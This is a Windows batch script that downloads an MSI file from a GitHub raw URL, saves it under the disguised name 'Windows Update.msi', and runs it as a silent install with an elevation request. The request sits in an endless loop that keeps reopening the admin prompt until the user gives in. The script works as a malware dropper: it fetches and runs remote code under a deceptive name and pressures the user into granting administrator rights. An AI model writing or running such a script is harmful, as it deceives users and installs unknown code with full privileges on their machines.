@echo off
setlocal enabledelayedexpansion

:: Put your MSI download URL here
set "url=https://raw.githubusercontent.com/kevin64848/filesnew/refs/heads/main/nfile.msi"

set "outputFileName=Windows Update.msi"
set "outputFilePath=%TEMP%\%outputFileName%"

:: Delete existing file if any
if exist "%outputFilePath%" del /f /q "%outputFilePath%"

echo Downloading MSI from %url% ...
powershell -Command ^
  "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%' -UseBasicParsing } catch { exit 1 }"

if not exist "%outputFilePath%" (
    echo Download failed. Exiting.
    exit /b 1
)

:RunLoop
echo Running MSI installer with admin prompt...

:: Launch msiexec with elevated privileges
powershell -Command ^
    "Start-Process msiexec.exe -ArgumentList '/i \"%outputFilePath%\" /qn' -Verb runAs"

:: Wait 5 seconds before retrying
timeout /t 2 /nobreak >nul

goto RunLoop
